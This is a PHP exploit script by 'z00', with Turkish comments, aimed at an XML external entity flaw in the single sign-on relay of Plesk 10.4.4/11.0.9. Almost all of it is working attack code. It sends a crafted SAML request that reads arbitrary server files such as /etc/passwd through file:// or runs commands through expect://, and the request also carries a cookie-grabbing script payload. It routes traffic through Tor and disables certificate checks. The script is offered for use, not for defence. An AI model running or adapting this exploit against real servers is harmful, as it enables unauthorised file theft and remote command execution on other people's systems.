# Exploit Title: Plesk SSO XXE injection (Old bug) Exploit   			#
# Date: 12 06 2014                                                           	#
# Exploit Author: z00                                                         	#
# Software Link: http://www.parallels.com/                           		#
# Version: 11.0.9 10.4.4                                                        #
# Tested on: linux all                                                          #
<?php

/*

████████████████████████████
█______¶¶¶¶¶¶______________█
█____¶¶¶¶¶¶¶¶¶¶____________█
█___¶¶¶¶¶¶¶¶¶¶¶¶¶__________█
█__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_________█
█_¶¶¶¶¶¶¶______¶¶¶_________█
█_¶¶¶¶¶¶________¶¶__¶¶_____█
█_¶¶¶¶¶¶____________¶¶¶____█
█_¶¶¶¶¶_____________¶¶¶¶¶¶_█
█_¶¶¶¶¶____________¶¶¶¶¶¶¶_█
█_¶¶¶¶¶___________¶¶¶¶¶¶¶__█
█_¶¶¶¶¶____________¶¶¶¶¶¶__█
█_¶¶¶¶¶_____________¶¶¶¶¶¶_█
█_¶¶¶¶¶¶____________¶¶¶_¶¶_█
█__¶¶¶¶¶¶______¶¶___¶¶_____█
█__¶¶¶¶¶¶¶____¶¶¶__________█
█___¶¶¶¶¶¶¶¶¶¶¶¶___________█
█____¶¶¶¶¶¶¶¶¶¶____________█
█_____¶¶¶¶¶¶¶______________█
████████████████████████████

Plesk SSO XXE injection (Old bug) Exploit
Coded by z00 (electrocode)
Twitter: electrocode

Not: Tor kurulu değilse  proxy kismini kaldirin

Bug founded http://makthepla.net/blog/=/plesk-sso-xxe-xss


Tüm İslam Aleminin Beraat gecesi mubarek olsun dua edin:)

*/
function Gonder($domain,$komut,$method){
	switch($method)
	{
	case "cmd":
	$komut = "expect://$komut";
	break;
	case "read":
	$komut = "file://$komut";
	break;
	default:
	$komut = "file://$komut";

	}

$adres = "https://$domain:8443/relay";
$paket = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><!DOCTYPE doc [ <!ENTITY xxe SYSTEM \"$komut\"> ] >
<samlp:AuthnRequest xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" ID=\"dff578c3049f5ba10223df820123fcccbc134e7520\" Version=\"2.0\" IssueInstant=\"2014-05-08T11:58:33Z\" Destination=\"javascript:prompt(document.domain,document.cookie)\"> <saml:Issuer>&xxe;</saml:Issuer> <samlp:Extensions> <UI><URL>&xxe;</URL></UI> </samlp:Extensions> <ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"> <ds:SignedInfo><ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/> <ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/> <ds:Reference URI=\"#dff578c3049f5ba10223df820123fcccbc134e7520\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><ds:Transform
Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/><ds:DigestValue>5BWiyX9zvACGR5y+NB2wxuXJtJE=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>S4LhCUOB0ylT4cjXUVAbnvrBjBBzybaxvWHTGw9JnRsyUB1MetRK+VHvV/M3Q4NX0DGUNFXlCZR3sM2msQOAhbjZxkKQCNUBig56/03pgsXlpWJFhnBL8m0sRRZBduf4QdHn/hxxyvAKzadPQ5nmIPmCPpO1CQsRUTMrt/13VIE=</ds:SignatureValue> </ds:Signature></samlp:AuthnRequest>";

$exploit = urlencode(base64_encode($paket));
$relaystate = gethostbyname($domain);
$relayadres = urlencode(base64_encode($relaystate));
$postlar = "SAMLRequest=$exploit&response_url=http://hax&RelayState=$relayadres&RefererScheme=https&RefererHost=https://$domain:8443&RefererPort=8443";


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$adres);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13');
curl_setopt($ch, CURLOPT_REFERER,$adres);
curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
//Proxy
curl_setopt($ch, CURLOPT_PROXY, "127.0.0.1:9050");
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
//Proxy end
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS,$postlar );
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$sonuc = curl_exec ($ch);
curl_close ($ch);
$gelenpaket = //"Paket: " . $postlar .
					"Gonderilen Paket Boyutu: " . strlen($exploit)."\nRelayAdres: $relaystate\nSonuc: \r\n\r\n$sonuc \n";
return $gelenpaket;
}

if($argc < 4){
$kullanim =  "########################################################################\n";
$kullanim .= "Plesk XXE Exploit Tool by z00\n";
$kullanim .= "Kullanimi : php $argv[0].php domain /etc/passwd read							\n";
$kullanim .= "Example : php $argv[0].php adres cmd (only expect installed) method	   \n";
$kullanim .= "Kullanilabilir Methodlar : \ncmd (Expect kurulu ise)\nread (Dosya okur)  \n";
$kullanim .= "########################################################################\r\n";
 echo $kullanim;
} else {
$domain = $argv[1];
$komut = $argv[2];
$method = $argv[3];
echo Gonder($domain,$komut,$method);

}

?>